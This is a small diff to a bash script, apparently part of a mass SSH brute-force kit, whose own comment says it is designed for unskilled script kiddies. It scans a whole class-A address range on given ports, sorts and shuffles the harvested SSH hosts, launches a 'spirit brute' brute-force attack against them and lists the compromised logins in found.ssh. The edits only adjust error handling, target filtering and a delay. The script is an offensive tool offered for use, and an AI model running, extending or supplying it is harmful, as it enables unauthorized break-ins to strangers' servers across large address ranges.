@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Designed for unskilled script kiddies and the sort...
 
@@ -6,10 +7,6 @@ if [ $# != 3 ]; then
     echo -e "[-] \e[31mUsage example: $0 <class-A> <port1,port2,port3> <speed> \e[0m"
     exit
 fi
-
-# exit when any command fails
-set -e
-
 clear
 
 echo -e "[+] increasing system limits"
@@ -48,11 +45,11 @@ echo -e "[*]            Debian: \e[93m[$debian]\e[0m"
 echo -e "[*]            FreeBSD: \e[93m[$freebsd]\e[0m"
 echo -e "[*]            Others: \e[93m[$other]\e[0m"
 
-grep SSH-2.0-OpenSSH b.lst |sort|uniq|shuf>h.lst
+cat <b.lst|sort|uniq|shuf>h.lst
 
 echo -e "[+] starting brute-force attack"
 ./spirit brute
 
 echo -e "[+] done, let's see what we've found:"
-sleep 5
+sleep 3
 head -n20 found.ssh
